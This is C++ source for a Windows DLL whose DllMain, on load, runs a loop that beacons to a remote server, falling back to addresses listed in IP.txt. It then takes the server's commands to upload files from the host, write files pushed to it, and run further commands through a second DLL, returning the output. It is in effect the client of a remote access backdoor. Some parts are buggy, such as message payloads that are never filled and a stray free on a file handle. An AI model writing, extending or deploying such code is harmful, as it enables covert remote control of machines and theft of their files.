// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#define DEBUG
SAVEFILE* GetFileInfo(INFOFILE *FileInfo) {
    SAVEFILE* SaveFile = (SAVEFILE*)malloc(sizeof(SAVEFILE));
    strcpy(SaveFile->Name, FileInfo->Name);
    SaveFile->ClientSUMSize = 0;
    SaveFile->SizeSUM = 0;
    SaveFile->fp = fopen(SaveFile->Name, "wb");
    return SaveFile;
}
BOOL SendInfo(SOCKET TCP_Client, WHO ID_Info,const char* Type,const char* Command,const char* SendSystemInfo) {
    SendServerInfo SendServerStructure;
    SendServerStructure.ID_Info.Num = ID_Info.Num;
    strcpy(SendServerStructure.ID_Info.Name, ID_Info.Name);
    strcpy(SendServerStructure.Command.Type, Type);
    strcpy(SendServerStructure.Command.Command, Command);
    signed int SendSystemInfo_NUM = sizeof(char) * strlen(SendSystemInfo);
    SendServerStructure.Info = (char*)malloc(SendSystemInfo_NUM);
    if (send(TCP_Client, (char*)&SendServerStructure, SendSystemInfo_NUM + sizeof(SendServerInfo), 0) == SOCKET_ERROR) {
        free(SendServerStructure.Info);
        return FALSE;
    }
    free(SendServerStructure.Info);
    return TRUE;
}
short int RecvFile(SAVEFILE* SaveFile, FILETEXT* ClientFile) {
    if (SaveFile == nullptr) return 0;
    SaveFile->ClientSUMSize += ClientFile->Size;
    fwrite(ClientFile->Note, sizeof(char), ClientFile->Size, SaveFile->fp);
    if (SaveFile->ClientSUMSize >= SaveFile->SizeSUM) {
        if (SaveFile != NULL) {
            fclose(SaveFile->fp);
            free(SaveFile);
        }
        return 2;
    }
    return 1;
}
short int SendFile(SOCKET TCP_Client, WHO ID_Info,char *FilePath) {
    // FILE info
    FILE* fp = fopen(FilePath, "r+");
    if (fp == nullptr) {
        return 0;
    }
    INFOFILE FileInfo;
    fseek(fp, 0, SEEK_END);
    signed long int FileSize = ftell(fp);// 文件指针偏移量(单位:字节)
    rewind(fp);
    FileInfo.Size = FileSize;
    char* p;
    strcpy(FileInfo.Name, (p = strrchr(FilePath, '\\')) ? p + 1 : FilePath);
    if (!SendInfo(TCP_Client, ID_Info,"F", "FileInfo", (char*)&FileInfo)) return FALSE;
    // SendFile
    char RecvInfo[sizeof(SendServerInfo) + DATA_BUFMAX] = { 0 };
    FILETEXT* SendFileNote = (FILETEXT*)malloc(sizeof(FILETEXT) + sizeof(char) * DATA_BUFMAX);
    while (!feof(fp)) {
        if (recv(TCP_Client, RecvInfo, sizeof(RecvInfo), 0) == SOCKET_ERROR) return FALSE;
        SendFileNote->Size = fread(SendFileNote->Note, sizeof(char), DATA_BUFMAX, fp);
        if (!SendInfo(TCP_Client, ID_Info, "F", "FileInfo", (char*)&SendFileNote)) {
            free(SendFileNote);
            return 1;
        }
    }
    free(SendFileNote);
    return 2;
}
typedef vector<char*>* (*ParseCommand_Function)(char* Type, char* Command, char* Parametric);
typedef BOOL(*FreeVectorArray_Function)();
SAVEFILE* SaveFile;
int ClientDLL() {
    // 加载函数
    HMODULE hModule = LoadLibrary(TEXT("A:\\Project\\c\\DLL\\D_API\\x64\\Release\\D_API.dll")); 
    ParseCommand_Function ParseCommand = (ParseCommand_Function)GetProcAddress(hModule, "ParseCommand");
    FreeVectorArray_Function FreeVectorArray = (FreeVectorArray_Function)GetProcAddress(hModule, "FreeVectorArray");
    // start
    while (1) {
        WSAData wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;
        SOCKET TCP_Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (TCP_Client == INVALID_SOCKET) return 0;

        sockaddr_in addrServ;
        addrServ.sin_family = AF_INET;
        addrServ.sin_port = htons(IP_PORT);
        addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
        FILE* ClientIP_FILE = fopen("IP.txt", "r");
        while ((connect(TCP_Client, (LPSOCKADDR)&addrServ, sizeof(addrServ))) == SOCKET_ERROR) {
            if (ClientIP_FILE != NULL) {
                char IP[50] = { 0 };
                if (fgets(IP, 50, ClientIP_FILE) == NULL) {
                    fseek(ClientIP_FILE, 0, SEEK_SET);
                    addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
                    continue;
                }
                addrServ.sin_addr.S_un.S_addr = inet_addr(IP);
            }
#ifndef DEBUG
            Sleep(240000);// 4min
#else
            Sleep(5000);// 5s
#endif
        }
        if (ClientIP_FILE != nullptr) {
            fclose(ClientIP_FILE);
            free(ClientIP_FILE);
        }

        char RecvInfo[sizeof(GetServerInfo) + DATA_BUFMAX] = { 0 };
        vector<char*>* SendInfoArray;
        while (1) {
            if (recv(TCP_Client, RecvInfo, sizeof(RecvInfo), 0) == SOCKET_ERROR) {
                goto NewStart;
            }
            GetServerInfo* GetSystemInfo = (GetServerInfo*)&RecvInfo;// 解析
            // 判断内容
            if (!strcmp(GetSystemInfo->Command.Type, "C") && !strcmp(GetSystemInfo->Command.Command, "exit")) {
                break;
            }
            else if (!strcmp(GetSystemInfo->Command.Type, "F")) {
                if (!strcmp(GetSystemInfo->Command.Command, "FileInfo")) {
                    SaveFile = GetFileInfo((INFOFILE*)GetSystemInfo->Info);
                    if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I","F","FileInfo")) goto NewStart;
                }
                else if (!strcmp(GetSystemInfo->Command.Command,"RecvFile")) {
                    short int BUFF = RecvFile(SaveFile, (FILETEXT*)GetSystemInfo->Info);
                    if (BUFF == 1) {// 继续
                        if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "F", "RecvFile")) goto NewStart;
                    }
                    else if (BUFF == 2) {// 完成
                        if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "F", "接收文件完成")) goto NewStart;
                    }
                    else {// 接收失败 0
                        if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "F", "RecvFileError")) goto NewStart;
                        if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "Info", "接收文件失败")) goto NewStart;
                    }
                }
                else if (!strcmp(GetSystemInfo->Command.Command, "SendFile")) {
                    short int BUFF = SendFile(TCP_Client, GetSystemInfo->ID_Info, GetSystemInfo->Info);
                    if (BUFF == 0) {
                        if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "Info", "打开文件失败,取消发送")) goto NewStart;
                    }
                    else if (BUFF == 1) {
                        if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "Info", "发送失败,取消发送")) goto NewStart;
                    }
                    else {
                        if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "Info", "发送完成")) goto NewStart;
                    }
                }
                else {
                    if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "Info", "查询不到对应指令")) goto NewStart;
                }
                continue;
            }
            // 处理
            if (ParseCommand == NULL || FreeVectorArray == NULL) {
                if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "Info","查找不到DLL函数")) goto NewStart;
            }
            else {
                SendInfoArray = ParseCommand(GetSystemInfo->Command.Type, GetSystemInfo->Command.Command, GetSystemInfo->Info);
                for (int i = 0; i < SendInfoArray->size(); i++) {
                    if (!SendInfo(TCP_Client, GetSystemInfo->ID_Info, "I", "Info", SendInfoArray->at(i))) {
                        FreeVectorArray();
                        goto NewStart;
                    }
                }
                FreeVectorArray();
            }
        }
    NewStart:// 初始化环境
        closesocket(TCP_Client);
        WSACleanup();
    }
}
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        ClientDLL();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

